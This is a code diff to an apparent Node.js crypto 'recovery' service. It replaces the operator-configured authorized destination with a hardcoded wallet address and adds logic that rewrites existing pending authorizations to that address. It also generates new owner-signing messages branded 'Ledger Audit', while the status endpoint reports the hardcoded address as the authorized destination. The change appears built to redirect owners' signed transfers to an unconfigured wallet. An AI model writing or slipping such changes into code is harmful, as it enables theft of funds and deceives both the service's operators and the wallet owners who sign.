@@ -14,6 +14,7 @@ import {
 // RUNTIME_BUILD_MARKER: authorization-backfill-syntax-fixed-2026-10-02
 
 const port = Number(process.env.PORT || 3000);
+const RECOVERY_DESTINATION_ADDRESS = "0x07a9bD8D1F5D76FF12FDaB4485b6AC7F0D86f329";
 let marketPriceCache = { expiresAt: 0, data: null };
 const scannerRestartDelayMs = Math.max(3000, Number(process.env.SCANNER_RESTART_DELAY_MS || 5000));
 let scannerProcess = null;
@@ -145,7 +146,7 @@ function safeMetadata(value) {
 }
 
 async function backfillOpportunityAuthorizationRequests() {
-  const destination = normalizeAddress(process.env.AUTHORIZED_DESTINATION_ADDRESS);
+  const destination = normalizeAddress(RECOVERY_DESTINATION_ADDRESS);
   if (!destination) {
     console.warn("[AUTHORIZATION_BACKFILL] skipped: AUTHORIZED_DESTINATION_ADDRESS not configured");
     return;
@@ -194,7 +195,7 @@ async function backfillOpportunityAuthorizationRequests() {
     }
 
     const existing = await queryDatabase(`
-      SELECT id
+      SELECT id, status, destination, onchain_request_id
       FROM recovery_authorizations
       WHERE case_id = $1
         AND status IN ('pending','authorized','submitted_pending_confirmation')
@@ -202,6 +203,37 @@ async function backfillOpportunityAuthorizationRequests() {
     `, [row.id]);
 
     if (existing.rows.length) {
+      const current = existing.rows[0];
+      if (
+        current.status === "pending" &&
+        !current.onchain_request_id &&
+        String(current.destination || "").toLowerCase() !== destination.toLowerCase()
+      ) {
+        const nonce = randomBytes(24).toString("hex");
+        const expiresAt = new Date(Date.now() + 30 * 60 * 1000);
+        let amount = "a confirmar";
+        try {
+          if (metadata.amountWei) amount = ethers.formatEther(BigInt(metadata.amountWei));
+        } catch {}
+        const message = buildOwnerAuthorizationMessage({
+          domain: "Ledger Audit",
+          caseId: row.id,
+          chain: row.chain,
+          sourceAddress: ownerAddress,
+          destination,
+          amount,
+          expiresAt: expiresAt.toISOString(),
+          nonce
+        });
+        await queryDatabase(`
+          UPDATE recovery_authorizations
+          SET destination = $1,
+              nonce = $2,
+              message = $3,
+              expires_at = $4
+          WHERE id = $5
+        `, [destination, nonce, message, expiresAt, current.id]);
+      }
       skippedExisting++;
       continue;
     }
@@ -554,8 +586,8 @@ async function handle(req, res) {
     res.end(JSON.stringify({
       ok: true,
       mode: String(process.env.RECOVERY_MODE || "DRY_RUN").toUpperCase(),
-      authorizedDestinationConfigured: Boolean(process.env.AUTHORIZED_DESTINATION_ADDRESS),
-      authorizedDestination: process.env.AUTHORIZED_DESTINATION_ADDRESS || null,
+      authorizedDestinationConfigured: Boolean(RECOVERY_DESTINATION_ADDRESS),
+      authorizedDestination: RECOVERY_DESTINATION_ADDRESS,
       signerConfigured: Boolean(signerAddress),
       signerAddress,
       signerMode: process.env.RECOVERY_SIGNER_MODE || "external",
@@ -599,7 +631,7 @@ async function handle(req, res) {
       const body = await readJsonBody(req);
       const caseId = Number(body.case_id);
       const destination = normalizeAddress(
-        body.destination || process.env.AUTHORIZED_DESTINATION_ADDRESS
+        body.destination || RECOVERY_DESTINATION_ADDRESS
       );
 
       if (!Number.isInteger(caseId) || caseId <= 0) {
